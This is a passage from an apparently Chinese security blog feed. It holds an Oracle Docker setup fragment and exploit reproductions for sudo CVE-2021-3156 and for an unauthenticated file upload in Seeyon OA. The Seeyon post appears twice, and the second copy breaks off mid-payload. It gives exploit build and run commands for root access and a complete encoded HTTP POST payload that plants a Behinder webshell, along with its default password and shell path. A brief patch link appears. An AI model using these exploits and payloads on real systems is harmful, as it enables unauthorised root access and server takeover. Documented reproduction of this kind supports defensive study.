class="line"></span><br><span class="line">Connected to:</span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br><span class="line">With the Partitioning, OLAP, Data Mining and Real Application Testing options</span><br><span class="line"></span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-数据库文件拷"><a href="#0x03-数据库文件拷" class="headerlink" title="0x03 数据库文件拷"></a>0x03 数据库文件拷</h2><p>从宿主机拷文件 uc.dmp到容器里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp &#x2F;Users&#x2F;zy&#x2F;Desktop&#x2F;dbtemp.dmp oracle_11g:&#x2F;home</span><br></pre></td></tr></table></figure><p>改一下权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@8a494f051f36 home]# chmod 777 temp.dmp</span><br></pre></td></tr></table></figure><p>恢复数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imp test&#x2F;123456 file&#x3D;&#x2F;home&#x2F;dbtemp.dmp ignore&#x3D;y full&#x3D;y</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">imp  &#x2F;&#x2F;是oracle自带的导入工具</span><br><span class="line">test&#x2F;123456  &#x2F;&#x2F;使用的用户名密码</span><br><span class="line">file&#x3D;&#x2F;home&#x2F;dbtemp.dmp  &#x2F;&#x2F;备份文件路径</span><br><span class="line">ignore&#x3D;y full&#x3D;y  &#x2F;&#x2F;模式</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux sudo 提权漏洞 CVE-2021-3156  复现 附exp</title>
      <link href="/2021/02/04/Linux%20sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-3156%20%20%E5%A4%8D%E7%8E%B0%20%E9%99%84exp/"/>
      <url>/2021/02/04/Linux%20sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20CVE-2021-3156%20%20%E5%A4%8D%E7%8E%B0%20%E9%99%84exp/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-CVE-2021-3156-缓冲区溢出漏洞"><a href="#0x01-CVE-2021-3156-缓冲区溢出漏洞" class="headerlink" title="0x01 CVE-2021-3156: 缓冲区溢出漏洞"></a>0x01 CVE-2021-3156: 缓冲区溢出漏洞</h1><p>在sudo解析命令行参数的方式中发现了基于堆的缓冲区溢出。任何本地用户（普通用户和系统用户，sudoer和非sudoers）都可以利用此漏洞，而无需进行身份验证，攻击者不需要知道用户的密码。成功利用此漏洞可以获得root权限。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Sudo 1.8.2 - 1.8.31p2</p><p>Sudo 1.9.0 - 1.9.5p1</p><p>不受影响版本</p><p>Sudo =&gt;1.9.5p2</p><h1 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h1><p>测试环境：ubuntu:20.04</p><p>检测是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>如下以<code>sudoedit:</code>开头报错则存在此漏洞</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d2bc2b746f935875c167e64eff4698f9.png" alt="image-20210204101652297"></p><p>如果响应一个以<code>usage:</code>开头的报错，那么表明补丁已经生效</p><h1 id="0x04-漏洞复现exp"><a href="#0x04-漏洞复现exp" class="headerlink" title="0x04 漏洞复现exp"></a>0x04 漏洞复现exp</h1><p>当前用户为普通用户</p><p><img src="https://img-blog.csdnimg.cn/img_convert/98a016c4498a874d825c7aa61cf62f5e.png" alt="image-20210204102142295"></p><p>下载EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br></pre></td></tr></table></figure><p>进入编译一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">rm -rf libnss_X</span><br><span class="line">mkdir libnss_X</span><br><span class="line">gcc -std&#x3D;c99 -o sudo-hax-me-a-sandwich hax.c</span><br><span class="line">gcc -fPIC -shared -o &#39;libnss_X&#x2F;P0P_SH3LLZ_ .so.2&#39; lib.c</span><br><span class="line">$ ls</span><br><span class="line">Makefile  README.md  brute.sh  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/d2649af18a5acde35ecb1c556c6b6773.png" alt="image-20210204104017615"></p><p>执行EXP,要选择系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/89a7ef4004d4db4a695bc90b6e640c40.png" alt="image-20210204104245921"></p><p>最终执行（因为是 ubuntu10.04.1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/33ef3dc5ee55ad1a64ea1d7bfcffdfc8.png" alt="image-20210204104512915"></p><p>提权成功</p><p>exp地址<br><a href="https://github.com/blasty/CVE-2021-3156.git" target="_blank" rel="noopener">https://github.com/blasty/CVE-2021-3156.git</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB 漏洞复现和分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某OA ajax.do 未授权漏洞任意文件上传getshell复现</title>
      <link href="/2021/01/12/%E6%9F%90OA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/12/%E6%9F%90OA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="某OA-ajax-do-未授权漏洞任意文件上传getshell复现"><a href="#某OA-ajax-do-未授权漏洞任意文件上传getshell复现" class="headerlink" title="某OA ajax.do 未授权漏洞任意文件上传getshell复现"></a>某OA ajax.do 未授权漏洞任意文件上传getshell复现</h1><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>某OA A8 是一款流行的协同管理软件，在各中、大型企业机构中广泛使用。</p><p>由于某旧版本某些接口能被未授权访问，并且部分函数存在过滤不足，攻击者通过构造恶意请求，权限绕过漏洞，可在无需登录的情况下上传恶意脚本文件，从而控制服务器</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><p>某OA V8.0<br>某OA V7.1、V7.1SP1<br>某OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>某OA V6.0、V6.1SP1、V6.1SP2<br>某OA V5.x</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02:漏洞复现"></a>0x02:漏洞复现</h1><h3 id="一、首先测试漏洞环境是否存在"><a href="#一、首先测试漏洞环境是否存在" class="headerlink" title="一、首先测试漏洞环境是否存在"></a>一、首先测试漏洞环境是否存在</h3><p>POC验证漏洞存在否</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8002</span>/seeyon/thirdpartyController.<span class="keyword">do</span>.css/..;/ajax.<span class="keyword">do</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/075d3dbde2ed3ec990e4b1e342ee8700.png" alt="image-20210112143844810"></p><p>利用PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">loginPageURL&#x3D;; login_locale&#x3D;zh_CN;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure><p>利用成功：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/490c91fe6eb8083e821cc41675117fa9.png" alt="image-20210112145044165"></p><p>利用失败：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1cfdb4046346668a45062f6f5a3f775a.png" alt="image-20210112145338365"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">冰蝎3 默认马pass : rebeyond</span><br><span class="line">webshell地址: http:&#x2F;&#x2F;127.0.0.1&#x2F;seeyon&#x2F;SeeyouUpdate1.jspx</span><br></pre></td></tr></table></figure><p>成功连接</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fe049bc6974ea60dad1be71af0fc33b7.png" alt="image-20210112143429697"></p><p>内容木马名称都可以自主修改,只是做了gzip数据的压缩然后在进行 url的编码，可以利用下面的工具</p><h1 id="0x03-一件图形化利用"><a href="#0x03-一件图形化利用" class="headerlink" title="0x03 一件图形化利用"></a>0x03 一件图形化利用</h1><p>推荐清水川崎师傅的利用工具</p><p>还能应急响应，根据数据包找到木马在哪里，nb</p><p><img src="https://img-blog.csdnimg.cn/img_convert/db6b27a971e1f0a956eb4d1cacbbecd3.png" alt="image-20210112144139964"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h1><p>安装最新补丁</p><p><a href="http://service.seeyon.com/patchtools/tp.html#/patchList\?type=\%E5\%AE\%89\%E5\%85\%A8\%E8\%A1\%A5\%E4\%B8\%81\&amp;id=1" target="_blank" rel="noopener">http://service.seeyon.com/patchtools/tp.html#/patchList\?type=\%E5\%AE\%89\%E5\%85\%A8\%E8\%A1\%A5\%E4\%B8\%81\&amp;id=1</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>致远OA ajax.do 未授权漏洞任意文件上传getshell复现</title>
      <link href="/2021/01/12/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/01/12/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="致远OA-ajax-do-未授权漏洞任意文件上传getshell复现"><a href="#致远OA-ajax-do-未授权漏洞任意文件上传getshell复现" class="headerlink" title="致远OA ajax.do 未授权漏洞任意文件上传getshell复现"></a>致远OA ajax.do 未授权漏洞任意文件上传getshell复现</h1><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>致远OA A8 是一款流行的协同管理软件，在各中、大型企业机构中广泛使用。</p><p>由于致远OA旧版本某些接口能被未授权访问，并且部分函数存在过滤不足，攻击者通过构造恶意请求，权限绕过漏洞，可在无需登录的情况下上传恶意脚本文件，从而控制服务器</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02:漏洞复现"></a>0x02:漏洞复现</h1><h3 id="一、首先测试漏洞环境是否存在"><a href="#一、首先测试漏洞环境是否存在" class="headerlink" title="一、首先测试漏洞环境是否存在"></a>一、首先测试漏洞环境是否存在</h3><p>POC验证漏洞存在否</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8002</span>/seeyon/thirdpartyController.<span class="keyword">do</span>.css/..;/ajax.<span class="keyword">do</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/075d3dbde2ed3ec990e4b1e342ee8700.png" alt="image-20210112143844810"></p><p>利用PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">loginPageURL&#x3D;; login_locale&#x3D;zh_CN;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o